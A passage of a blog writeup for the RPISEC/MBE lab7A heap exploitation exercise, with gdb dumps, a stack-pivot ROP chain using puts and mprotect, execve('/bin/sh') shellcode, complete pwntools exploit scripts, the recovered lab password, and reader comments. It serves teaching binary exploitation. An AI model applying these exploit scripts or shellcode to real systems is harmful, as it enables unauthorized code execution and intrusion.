0x80f19e0:      0x137db5d1      0x7d14f569      0x2f24ff9b      0x1d0207b8
0x80f19f0:      0x497bca52      0x29524eb3      0x767ac622      0x14af9260
0x80f1a00:      0x0bd24bc5      0x3a9a828a      0x567926e0      0x160526ae
0x80f1a10:      0x1ddc5410      0x39638154      0x24d7bcfe      0x5597d31d
0x80f1a20:      0x2a9eb757      0x1dd2bbce      0x6636ac89      0x69aaaaca
0x80f1a30:      0x758f3b73      0x3599619f      0x530282ba      0x6e053b1c
0x80f1a40:      0x2d114a84      0x3e14113b      0x0f1f7049      0x0284b841
0x80f1a50:      0x301050fe      0x747b4935      0x0a120f71      0x46cc166e
0x80f1a60:      0x523cf490      0x3c55b428      0x6e65beda      0x5c4346f9
0x80f1a70:      0x083a8b13      0x68130ff2      0x373b8763      0x55eed321
0x80f1a80:      0x4a930a84      0x7bdbc3cb      0x173867a1      0x574467ef
0x80f1a90:      0x5c9d1551      0x7822c015      0x6596fdbf      0x14d6925c
0x80f1aa0:      0x6bdff616      0x5c93fa8f      0x2777edc8      0x28ebeb8b
0x80f1ab0:      0x34ce7a32      0x74d820de      0x1243c3fb      0x2f447a5d
0x80f1ac0:      0x6c500bc5      0x7f55507a      0x4e5e3108      0x43c5f900
0x80f1ad0:      0x715111bf      0x353a0874      0x4b534e30      0x000a4141
0x80f1ae0:      0x00000000      0x00020521      0x00000000      0x00000000
0x80f1af0:      0x00000000      0x00000000      0x00000000      0x00000000
0x80f1b00:      0x00000000      0x00000000      0x00000000      0x00000000

```

I created a new message using the length 131 and entered 130 \* “A” (+ a newline character). At the address `0x080eef60` (`messages`) the first heap pointer is stored: `0x080f19d8`. I printed the memory beginning at `0x080f19d8-8` because the heap chunks begins 8 bytes before the memory where the actual data is stored:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7A_01.png)

The first 4 bytes of the heap chunk contain the size of the previous chunk. The next 4 bytes contain the size of the chunk itself. Because of byte alignment the three least significant bits would always be zero and are used for flags:

–> 0x04: The memory belongs to a thread arena.

–> 0x02: The memory was allocated with the function `mmap`.

–> 0x01: The previous chunk is in use.

The chunk right after our chunk beginning at `0x80f1ae0` is the top of the heap also called *the wilderness*. The value `0x00020521` indicates that there are 0x20520 = 132384 bytes left for further allocations.

As we can see within the data of our chunk, we have successfully overwritten `msg_len` with the value `0x000a4141`:

```

...
0x80f1ad0:      0x715111bf      0x353a0874      0x4b534e30      0x000a4141
...

```

This means that we can use `edit_message` to overflow `message` by `0xa4141 - 128 = 671937` bytes. Of course we could set `msg_len` to an even bigger value, but this suffices to overwrite the next chunk on the heap.

At first let’s create another message generating a second chunk on the heap after the one we already created:

```

gdb-peda$ c
Continuing.
1
-----------------------------------------
-Using message slot #1
-Enter data length: 4
-Enter data to encrypt: AAA
-Message created successfully!

+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: ^C
Program received signal SIGINT, Interrupt.
...
gdb-peda$ x/80xw 0x080f19d8-8
0x80f19d0:      0x00000000      0x00000111      0x08048fd3      0x078d572f
0x80f19e0:      0x137db5d1      0x7d14f569      0x2f24ff9b      0x1d0207b8
...
0x80f1ad0:      0x715111bf      0x353a0874      0x4b534e30      0x000a4141
0x80f1ae0:      0x00000000      0x00000111      0x08048fd3      0x1fcab7ac
0x80f1af0:      0x13c8adcd      0x59269ff2      0x5ad6c09d      0x76520b8c
0x80f1b00:      0x3031749d      0x2a925bee      0x64adb511      0x41d6cbd2

```

The second messages has been stored in the chunk beginning at address `0x80f1ad0`. The first 4 bytes within the actual data contains the value `0x08048fd3`. This is the member-function `print_msg` which has been set to `print_message`.

As the `msg_len` of our first message is big enough, we can now use the `edit_message` function to overwrite the second heap chunk:

```

gdb-peda$ c
Continuing.
2
-----------------------------------------
-Input message index to edit: 0
-Input new message to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE
-Message has been successfully modified!

+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: ^C
Program received signal SIGINT, Interrupt.
...
gdb-peda$ x/80xw 0x080f19d8-8
0x80f19d0:      0x00000000      0x00000111      0x08048fd3      0x078d572f
0x80f19e0:      0x137db5d1      0x7d14f569      0x2f24ff9b      0x1d0207b8
...
0x80f1ac0:      0x6c500bc5      0x7f55507a      0x4e5e3108      0x43c5f900
0x80f1ad0:      0x715111bf      0x353a0874      0x4b534e30      0x42424242
0x80f1ae0:      0x43434343      0x44444444      0x45454545      0x1fcab70a
0x80f1af0:      0x13c8adcd      0x59269ff2      0x5ad6c09d      0x76520b8c
0x80f1b00:      0x3031749d      0x2a925bee      0x64adb511      0x41d6cbd2

```

For the new message I entered `"A" * 128 + "BBBBCCCCDDDDEEEE"`. As you can see in the heap output, `0x42424242` (`"BBBB"`) overwrote the member variable `msg_len` of the first chunk. `0x43434343` (`"CCCC"`) and `0x44444444` (`"DDDD"`) overwrote the heap meta-data of the second chunk messing up this chunk. Nevertheless the value `0x45454545` (`"EEEE"`) has been written in the first 4 bytes of the actual data of the second chunk. Because this 4 bytes contain the member-function `print_msg`, the program raises a segmentation fault when we try to print the second message:

```

gdb-peda$ c
Continuing.
4
-----------------------------------------
-Input message index to print: 1

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x45454545 ('EEEE')
EBX: 0x80481a8 (<_init>:        push   ebx)
ECX: 0xbffff6cd --> 0x4008000a
EDX: 0x80f1ae8 ("EEEE\n\267\312\037ͭ\310\023\362\237&Y\235\300\326Z\214\vRv\235t10\356[\222*\021\265\255d\322\313\326A\037\036\307PD\205\016i\027wXq\245a_0u\022G\022z\365qv\202\\\226:u[RYe \302a*\002x.\351\337\354\025\360\254\253\002\213*\\uy\237\214@\377\203\246P(dTzR\317KzP\023&!\303\356\\/aH\206(\021\262\267{-\200\363'\r")
ESI: 0x0
EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
ESP: 0xbffff6ac --> 0x8049521 (<print_index+160>:       mov    eax,0x0)
EIP: 0x45454545 ('EEEE')
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x45454545
[------------------------------------stack-------------------------------------]
0000| 0xbffff6ac --> 0x8049521 (<print_index+160>:      mov    eax,0x0)
0004| 0xbffff6b0 --> 0x80f1ae8 ("EEEE\n\267\312\037ͭ\310\023\362\237&Y\235\300\326Z\214\vRv\235t10\356[\222*\021\265\255d\322\313\326A\037\036\307PD\205\016i\027wXq\245a_0u\022G\022z\365qv\202\\\226:u[RYe \302a*\002x.\351\337\354\025\360\254\253\002\213*\\uy\237\214@\377\203\246P(dTzR\317KzP\023&!\303\356\\/aH\206(\021\262\267{-\200\363'\r")
0008| 0xbffff6b4 --> 0x0
0012| 0xbffff6b8 --> 0xa ('\n')
0016| 0xbffff6bc --> 0x80ed240 --> 0xfbad2887
0020| 0xbffff6c0 --> 0x80ed240 --> 0xfbad2887
0024| 0xbffff6c4 --> 0x29 (')')
0028| 0xbffff6c8 --> 0x1
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x45454545 in ?? ()

```

Great! We successfully completed the first part of the challenge:

–> We found a heap overflow vulnerability within the program.

–> We succeeded in leveraging this vulnerability to control the instruction pointer (`eip`).

The next big question is: *Where should we jump to?*

As we figured out, the binary was statically linked. So let’s first check if our favourite function `system` has been built in:

```

[0x08048d2a]> is~system
vaddr=0x080d5660 paddr=0x0008d660 ord=738 fwd=NONE sz=62 bind=LOCAL type=OBJECT name=system_dirs
vaddr=0x080d564c paddr=0x0008d64c ord=739 fwd=NONE sz=16 bind=LOCAL type=OBJECT name=system_dirs_len

```

Does not look good. Maybe the binary at least contains the string `"/bin/sh"` and we can create a ROP-chain executing the syscall `execve`?

```

[0x08048d2a]> / /bin/sh
Searching 7 bytes from 0x08048000 to 0x080eff18: 2f 62 69 6e 2f 73 68
# 6 [0x8048000-0x80eff18]
hits: 0

```

Nope, no `"/bin/sh"`.

While searching through the built-in functions I stumbled upon the following:

```

[0x08048d2a]> is~mprotect
vaddr=0x0806f340 paddr=0x00027340 ord=1248 fwd=NONE sz=37 bind=GLOBAL type=FUNC name=__mprotect
vaddr=0x0806f340 paddr=0x00027340 ord=2227 fwd=NONE sz=37 bind=UNKNOWN type=FUNC name=mprotect

```

The binary contains the function `mprotect`:

```

lab7A@warzone:/levels/lab07$ man mprotect
MPROTECT(2)                                   Linux Programmer's Manual                                  MPROTECT(2)

NAME
       mprotect - set protection on a region of memory

SYNOPSIS
       #include <sys/mman.h>

       int mprotect(void *addr, size_t len, int prot);

DESCRIPTION
       mprotect()  changes  protection  for  the calling process's memory page(s) containing any part of the address
       range in the interval [addr, addr+len-1].  addr must be aligned to a page boundary.

...

```

`mprotect` can be used to change the protection of memory pages. As for now we cannot execute shellcode in the stack or heap because these segments are marked as `RW` only because `NX` is enabled:

```

gdb-peda$ ! cat /proc/$(pidof lab7A)/maps
08048000-080ec000 r-xp 00000000 fc:00 922475     /levels/lab07/lab7A
080ec000-080ee000 rw-p 000a3000 fc:00 922475     /levels/lab07/lab7A
080ee000-08112000 rw-p 00000000 00:00 0          [heap]
b7ffc000-b7ffd000 rw-p 00000000 00:00 0
b7ffd000-b7ffe000 r-xp 00000000 00:00 0          [vdso]
b7ffe000-b8000000 r--p 00000000 00:00 0          [vvar]
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]

```

If we call `mprotect` to make the heap executable, we could store a shellcode in the heap and then redirect the instruction pointer to that shellcode.

Before we can call `mprotect` we need to leak the address of the heap since we must pass the address as the first argument to `mprotect`.

Let’s have a look if there is a function built in which can print something for us:

```

[0x08048d2a]> is~puts
vaddr=0x08050bf0 paddr=0x00008bf0 ord=1359 fwd=NONE sz=335 bind=UNKNOWN type=FUNC name=puts
...

```

Looks good. The function `puts` is located at `0x08050bf0`. If we pass the fixed address of the global array `messages` (`0x80eef60`) to `puts` at least the address of the first heap pointer will be printed.

But how do we pass arguments to `puts`? In a stack overflow scenario we could easily overwrite the return address on the stack with a function address and just keep on writing further bytes which will be stored after the return address ending up to be the arguments to the called function.

With the heap overflow vulnerability we discovered, we can only overwrite one function address. If we write more bytes, these will not be stored on the stack, but within the struct object on the heap. Thus this does not help us passing arguments to the function we want to call. In the last level we leveraged the fact that the member-function we could overwrite was being called with an argument which fits our needs. In this level the member-function is called passing the whole struct instance:

```

    messages[i]->print_msg(messages[i]);

```

As the first member in the struct is the member-function itself, we cannot change this value because it must contain the address of the function we would like to call.

This means we have to do a little trick. Do you remember level [lab5A](http://www.devel0pment.de/?p=366#lab5A)? We introduced a technique called *Stack Pivoting*. When using *ROP* and there is only one gadget we can call, we should call a gadget which changes the stack pointer (`esp`) so that it will point to a region on the stack which we can control. In this region we can place further gadgets which will be called one after another.

But how do we control a region on the stack? There is no stack overflow vulnerability!? Well, we do not need a vulnerability to modify the stack. All local variables are stored on the stack. And did you recognize the quite unusual way the index is read from the user in `print_index` and all other functions requiring an index?

```

    char numbuf[32];
    unsigned int i = 0;

    /* get message index to print */
    printf("-Input message index to print: ");
    fgets(numbuf, sizeof(numbuf), stdin);
    i = strtoul(numbuf, NULL, 10);

```

The buffer for the index (`numbuf`) is 32 byte long! Quite large for an index but perfect to store more gadgets on the stack 🙂

One thing we have to consider is that the buffer must contain a valid index in the first bytes:

```

    if(i >= MAX_MSG || messages[i] == NULL)
    {
        printf("-Invalid message index!\n");
        return 1;
    }

    /* print the message of interest */
    messages[i]->print_msg(messages[i]);

```

If `i` is not a valid index, the member-function `print_msg` does not get called. As the user input is read using `fgets` we can place null-bytes in our input. If we enter `"1\x00AAAAAAAAAAAA..."` for example `strtoul` will return the valid index `1` but the buffer `numbuf` will still contain the additional `"AAAA..."`.

Summing it up we will do the following to leak the heap address:

–> Create a message with the length 131, overwriting `msg_len`.

–> Create a second message.

–> Edit the first message leveraging the overwritten `msg_len` to overwrite the member-function of the second message with the address of an appropriate stack pivoting gadget.

–> Selecting `4. Print message details` entering index 1 (second message) followed by a null-byte and additional gadgets, which will be stored on the stack.

The following images illustrates the approach:

![](https://devel0pment.de/wp-content/uploads/2018/02/lab7A_02.png)

The offset from the stack pointer (`esp`) to `numbuf` at the point of time the `print_msg` function is called can be determined using `gdb`:

```

gdb-peda$ disassemble print_index
Dump of assembler code for function print_index:
   ...
   0x0804951c <+155>:   mov    DWORD PTR [esp],edx
   0x0804951f <+158>:   call   eax
   ...
   0x08049538 <+183>:   ret
End of assembler dump.
gdb-peda$ b *print_index+158
Breakpoint 1 at 0x804951f
gdb-peda$ r
Starting program: /levels/lab07/lab7A
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 1
-----------------------------------------
-Using message slot #0
-Enter data length: 4
-Enter data to encrypt: AAA
-Message created successfully!
...
Enter Choice: 4
-----------------------------------------
-Input message index to print: 0
[----------------------------------registers-----------------------------------]
EAX: 0x8048fd3 (<print_message>:        push   ebp)
EBX: 0x80481a8 (<_init>:        push   ebx)
ECX: 0xbffff6cd --> 0x4008000a
EDX: 0x80f19d8 --> 0x8048fd3 (<print_message>:  push   ebp)
ESI: 0x0
EDI: 0x80ecfbc --> 0x8069190 (<__stpcpy_sse2>:  mov    edx,DWORD PTR [esp+0x4])
EBP: 0xbffff6f8 --> 0xbffff728 --> 0x8049e70 (<__libc_csu_fini>:        push   ebx)
ESP: 0xbffff6b0 --> 0x80f19d8 --> 0x8048fd3 (<print_message>:   push   ebp)
EIP: 0x804951f (<print_index+158>:      call   eax)
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049512 <print_index+145>: mov    edx,DWORD PTR [ebp-0x30]
   0x8049515 <print_index+148>: mov    edx,DWORD PTR [edx*4+0x80eef60]
   0x804951c <print_index+155>: mov    DWORD PTR [esp],edx
=> 0x804951f <print_index+158>: call   eax
   0x8049521 <print_index+160>: mov    eax,0x0
   0x8049526 <print_index+165>: mov    ecx,DWORD PTR [ebp-0xc]
   0x8049529 <print_index+168>: xor    ecx,DWORD PTR gs:0x14
   0x8049530 <print_index+175>: je     0x8049537 <print_index+182>
Guessed arguments:
arg[0]: 0x80f19d8 --> 0x8048fd3 (<print_message>:       push   ebp)
[------------------------------------stack-------------------------------------]
0000| 0xbffff6b0 --> 0x80f19d8 --> 0x8048fd3 (<print_message>:  push   ebp)
0004| 0xbffff6b4 --> 0x0
0008| 0xbffff6b8 --> 0xa ('\n')
0012| 0xbffff6bc --> 0x80ed240 --> 0xfbad2887
0016| 0xbffff6c0 --> 0x80ed240 --> 0xfbad2887
0020| 0xbffff6c4 --> 0x29 (')')
0024| 0xbffff6c8 --> 0x0
0028| 0xbffff6cc --> 0x8000a30
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804951f in print_index ()
gdb-peda$ x/32xw $esp
0xbffff6b0:     0x080f19d8      0x00000000      0x0000000a      0x080ed240
0xbffff6c0:     0x080ed240      0x00000029      0x00000000      0x08000a30
0xbffff6d0:     0x080ed240      0x0000000a      0x00000029      0x08050280
0xbffff6e0:     0x080ed240      0x080c085e      0x00000004      0x2b329900
0xbffff6f0:     0x00000000      0x080ecfbc      0xbffff728      0x0804967e
0xbffff700:     0x080c0870      0x00000000      0x00000002      0x00000000
0xbffff710:     0x080ed014      0xbffff7b4      0x00000004      0x2b329900
0xbffff720:     0x00000000      0x080ecfbc      0x08049e70      0x080498ba
gdb-peda$ x/s $esp+0x1c
0xbffff6cc:     "0\n"

```

I set a breakpoint on the `call eax` instruction which call the member-function. In the output of the stack we can see the value `0x08000a30`. This is the `0 + newline` we entered. Thus the offset is `0x1c` before the call. Since the call places an additional item on the stack (the return address) the final offset is 0x20 = 32 byte.

An appropriate gadget can be found using `radare` or other ROP-tools (see [lab6](http://www.devel0pment.de/?p=366)). The gadget I used adds 32 byte to `esp` and `pop`s two times. Because this moves `esp` 4 bytes too far, I must append 6 fill bytes (`'A'` in the image) to make `esp` point to the address of `puts`. After the address of `puts` the next return address is stored. Here I simply placed the address of `main` in order to keep the program running. The last item on the stack is the address of `messages` which contains the heap pointers we want to be printed by `puts`.

The following python-script implements this approach leaking the heap address of the first `struct msg` stored in `messages[0]`:

```

lab7A@warzone:/levels/lab07$ cat /tmp/exploit_lab7A.py
from pwn import *

p = process("./lab7A")

#************************************************
# stage 1

# create first obj -> overflow 3 bytes changing msglen
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("131")               #    --> len = 131
p.sendline("A"*130)             #    --> data = "AAAAAA...\n"

# create second obj -> we are going to overwrite this shortly
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("4")                 #    --> len = 4
p.sendline("A"*3)               #    --> data = "AAA\n"

# overwrite second obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 # 2. Edit secure message
p.sendline("0")                 #    --> index = 0
expl = "A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
p.sendline(expl)                #    --> data = expl

# call function -> leak heap address
p.recvuntil("Enter Choice: ")
p.sendline("4")                 # 4. Print message details
num = "1\x00"
num += "A"*6
num += p32(0x8050bf0) # second gadget after pivoting: puts
num += p32(0x8049569) # return address: main
num += p32(0x80eef60) # 1st arg puts: messages
p.sendline(num)                 #    --> index = 1 (+rop-chain)

# output contains address of first heap object in messages array
ret = p.recvuntil("Enter Choice: ")
message_0 = int(ret[0x49:0x4d][::-1].encode("hex"), 16)
log.info("message_0 = " + hex(message_0))

```

Despite of ASLR we can now determine the address of `messages[0]` on the heap:

```

lab7A@warzone:/levels/lab07$ python /tmp/exploit_lab7A.py
[+] Starting program './lab7A': Done
[*] message_0 = 0x83f09d8
[*] Stopped program './lab7A'
lab7A@warzone:/levels/lab07$ python /tmp/exploit_lab7A.py
[+] Starting program './lab7A': Done
[*] message_0 = 0x891e9d8
[*] Stopped program './lab7A'
lab7A@warzone:/levels/lab07$ python /tmp/exploit_lab7A.py
[+] Starting program './lab7A': Done
[*] message_0 = 0x9a449d8
[*] Stopped program './lab7A'

```

What else to do to finally get a shell?

–> Store a shellcode which calls `execve("/bin/sh")` (see [lab3C](https://www.devel0pment.de/?p=317#lab3C)) in the heap using the known heap overflow vulnerability.

–> Use the explained approach to call `mprotect` making the heap executable (the required values for the arguments can be determined with `gdb` using the command `i proc mappings`).

–> As the return address of the call to `mprotect` set the address of our shellcode within the heap.

I added detailed comments to the final python-script which uses the remote service running on port 7741:

```

lab7A@warzone:/levels/lab07$ cat /tmp/exploit_lab7A.py
from pwn import *

p = remote("localhost", 7741)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"\
            "\x68\x2f\x62\x69\x6e\x89\xe3"\
            "\x89\xc1\x89\xc2\xb0\x0b\xcd"\
            "\x80\x31\xc0\x40\xcd\x80"

#************************************************
# stage 1

# create first obj -> overflow 3 bytes changing msg_len
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("131")               #    --> len = 131
p.sendline("A"*130)             #    --> data = "AAAAAA...\n"

# create second obj -> we are going to overwrite this shortly
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("4")                 #    --> len = 4
p.sendline("A"*3)               #    --> data = "AAA\n"

# overwrite second obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 # 2. Edit secure message
p.sendline("0")                 #    --> index = 0
expl = "A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
expl += shellcode
p.sendline(expl)                #    --> data = expl

# call function -> leak heap address
p.recvuntil("Enter Choice: ")
p.sendline("4")                 # 4. Print message details
num = "1\x00"
num += "A"*6
num += p32(0x8050bf0) # second gadget after pivoting: puts
num += p32(0x8049569) # return address: main
num += p32(0x80eef60) # 1st arg puts: messages
p.sendline(num)                 #    --> index = 1 (+rop-chain)

# output contains address of first heap object in messages array
ret = p.recvuntil("Enter Choice: ")
message_0 = int(ret[0x49:0x4d][::-1].encode("hex"), 16)
log.info("message_0 = " + hex(message_0))

#************************************************
# stage 2

# 3rd obj -> overflow msg_len by 3 bytes
p.sendline("1")                 # 1. Create secure message
p.sendline("131")               #    --> len = 131
p.sendline("A"*130)             #    --> data = "AAAAAA...\n"

# 4th obj -> we are going to overwrite this shortly
p.recvuntil("Enter Choice: ")
p.sendline("1")                 # 1. Create secure message
p.sendline("4")                 #    --> len = 4
p.sendline("A"*3)               #    --> data = "AAA\n"

# overwrite 4th obj
p.recvuntil("Enter Choice: ")
p.sendline("2")                 # 2. Edit secure message
p.sendline("2")                 #    --> index = 2
expl = "A"*132
expl += p32(0x00000000)
expl += p32(0x00000111)
expl += p32(0x0807e372) # add esp, 0x20; mov eax, esi; pop ebx; pop esi; ret
p.sendline(expl)                #   --> data = expl

# call function -> mprotect
p.recvuntil("Enter Choice: ")
p.sendline("4")                 # 4. Print message details
num = "3\x00"
num += "A"*6
num += p32(0x806f340)          # second gadget: __mprotect
num += p32(message_0 + 276)    # return: heap-address
num += p32(message_0 - 0x19d8) # memory-page heap
num += p32(0x22000)            # size = 0x22000
num += p32(0x7)                # prot = RWX
p.sendline(num)                 #    --> index = 3 (+rop-chain)
p.recv(100)

p.interactive()

```

Summing it up again the script does:

–> Leak the address of `messages[0]` on the heap using `puts`.

–> Store a shellcode on the heap which calls `execve("/bin/sh")`.

–> Use the leaked address to call `mprotect` making the heap executable.

–> Setting the address of the shellcode as the return address of the call.

Finally running the script:

```

lab7A@warzone:/levels/lab07$ python /tmp/exploit_lab7A.py
[+] Opening connection to localhost on port 7741: Done
[*] message_0 = 0x91ca9d8
[*] Switching to interactive mode
$ whoami
lab7end
$ cat /home/lab7end/.pass
0verfl0wz_0n_th3_h3ap_4int_s0_bad

```

Done! The final password for lab7 is `0verfl0wz_0n_th3_h3ap_4int_s0_bad`.

 Post Views: 13,005

  Categories[RPISEC/MBE](https://devel0pment.de/?cat=26), [writeup](https://devel0pment.de/?cat=7)  Tags[assembly](https://devel0pment.de/?tag=assembly), [binary](https://devel0pment.de/?tag=binary), [elf](https://devel0pment.de/?tag=elf), [pwn](https://devel0pment.de/?tag=pwn), [r2](https://devel0pment.de/?tag=r2), [reversing](https://devel0pment.de/?tag=reversing), [x86](https://devel0pment.de/?tag=x86)

## 5 Replies to “RPISEC/MBE: writeup lab07 (Heap Exploitation)”

1. ![](https://secure.gravatar.com/avatar/3015efadadcff6e5432b43f095c871fe?s=100&d=mm&r=g) **[Sidney Tagg](http://www.google.com)** says:
   [24. November 2020 at 1:38 pm](https://devel0pment.de/?p=386#comment-2624)

   Wow cuz this is great work! Congrats and keep it up!|
3. ![](https://secure.gravatar.com/avatar/9bb05cc5c5eb867fcee7a79305d1db71?s=100&d=mm&r=g) **smile** says:
   [6. September 2021 at 3:13 pm](https://devel0pment.de/?p=386#comment-3317)

   hey scryh,

   i’m kinda ok with this lab however I still have a silly questions: In lab7A’s final exploit, line 83. num += p32(message\_0 – 0x19d8).

   As I thought, this is like ASLR lab, real\_add = base\_add + offset, where offset is same every run. I also noticed that only 3 bytes stay unchanged. So I only sub 0x9d8 from message\_0 it also worked.

   So why do you pick 0x19d8 and when sub bigger than 0x19d8 or not like 0x\*9d8 the execution failed ? Should we only need shellcode excutable or there is something with mprotect?

   also found a small bug:

   “I set a breakpoint on the call eax instruction which call the member-function. In the output of the stack we can see the value 0x08000a30. This is the 1 + newline we entered. Thus the offset is 0x1c before the call. Since the call places an additional item on the stack (the return address) the final offset is 0x20 = 32 byte.”

   it is supposed to 0+newline rather than 1+newline i guess

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [7. September 2021 at 8:18 pm](https://devel0pment.de/?p=386#comment-3318)

      Hey smile,

      regarding mprotect the address passed as the first argument must be page aligned (page size is 0x1000, thus the 3 least significant nibbles must be zero, e.g.: 0x891e000). The reason for this is that the permissions can only be defined for a whole page. The second parameter (size) must not necessarily be page aligned, although mprotect will automatically set the permissions on whole pages. If you for example call mprotect(0x8672000, 0x1001, …), the permissions will be set for the two pages ranging from 0x8672000 to 0x8674000.

      You are totally right, that it is sufficient to make only the memory executable, which holds the shellcode. The parameters I chose make almost the whole heap memory executable. If you want to set the permissions more precisely, you have to assure that you pick the page aligned address before the memory, where the shellcode is stored (e.g. shellcode stored at 0x9a43114, address = 0x9a43000). For the size parameter you can simply use the size of the shellcode (although as mentioned before, mprotect will set the permissions on whole pages).

      Thanks for the note regarding the wrong number! I adjusted it 🙂

      scryh
5. ![](https://secure.gravatar.com/avatar/19f612e5381e8460e9b28c12d1cdacda?s=100&d=mm&r=g) **Tomer** says:
   [27. October 2021 at 5:24 pm](https://devel0pment.de/?p=386#comment-3408)

   hey scryh and thanks again for this amazing explanation.

   I have a question regard to 7C.

   in order to find the address of ‘system’ in libc, it is enough to leak an address of a function that doesn’t in libc itself(the print function), and calculate the offset between them. which mean that the ASLR doesn’t separate their address and randomize them as a one block. is it true? isn’t the libc should randomize as a separate block and therefore we should leak an address from libc?

   following this, why in the previous lab: 6A we looked for a specific address of libc to leak in order to calculate system if we could leak any address? thanks a lot

   1. ![](https://secure.gravatar.com/avatar/420a221dd96b4e3a2ffe39422a403e04?s=100&d=mm&r=g) **scryh** says:
      [28. October 2021 at 3:20 am](https://devel0pment.de/?p=386#comment-3411)

      Hey Tomer,

      having back a look on this, that is really a good question. Usually you are right and we need to leak a libc address and not an address from the binary in order to locate the system function. I assume the reason for this here is that the binary is compiled as position independent (gcc … -fPIE -pie) and the kernel used in the RPISEC/MBE VM is quite old by now. On a recent kernel the binary itself (in this case the function small\_str) is positioned within the memory independently from other libraries including the libc. Though it is still true that the offset between all libraries used by the binary stays the same (the libraries are not positioned independently from each other). You can test that by running ldd on a binary (e.g. ldd /usr/bin/ssh) a few times and compare the offset between two libraries throughout multiple runs. It should stay the same. It seems that the older kernel does not treat the position independent binary as a special case and positions it along with the other libraries resulting in the consistent offset between small\_str and system.

Comments are closed.

## Post navigation

[Previous PostPrevious   RPISEC/MBE: writeup lab06 (ASLR)](https://devel0pment.de/?p=378)[Next PostNext TAMUctf 18 – writeup pwn1-5](https://devel0pment.de/?p=407)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
